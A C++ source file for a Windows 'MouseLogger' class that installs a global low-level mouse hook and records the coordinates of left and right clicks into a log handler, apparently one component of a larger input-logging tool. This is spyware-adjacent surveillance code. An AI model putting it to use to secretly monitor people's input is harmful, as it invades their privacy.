#include "LoggerHandler.hpp"
#include "MouseLogger.hpp"

LoggerHandler *MouseLogger::_handler = nullptr;
const std::string	MouseLogger::_flag = "\a";

MouseLogger::MouseLogger()
{
}

MouseLogger::MouseLogger(LoggerHandler *handler)
{
	_handler = handler;
}

MouseLogger::~MouseLogger()
{
}

LRESULT CALLBACK MouseLogger::mouseEventProcCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSLLHOOKSTRUCT* mouse = (MSLLHOOKSTRUCT*)lParam;
	std::string		tmpStore;

	switch (wParam)
	{
	case WM_LBUTTONDOWN:
		tmpStore = _flag + "LCLICK:" + std::to_string(mouse->pt.x) + ";" + std::to_string(mouse->pt.y) + _flag;
		break;
	case WM_RBUTTONDOWN:
		tmpStore = _flag + "RCLICK:" + std::to_string(mouse->pt.x) + ";" + std::to_string(mouse->pt.y) + _flag;
		break;
	default:
		break;
	}
	_handler->addLog(tmpStore);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


bool			MouseLogger::start()
{
	_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, this->mouseEventProcCallback, GetModuleHandle(NULL), 0);
	return true;
}

void			MouseLogger::stop() const
{
	UnhookWindowsHookEx(_mouseHook);
}

std::string		MouseLogger::getLog()
{
	return "";
}
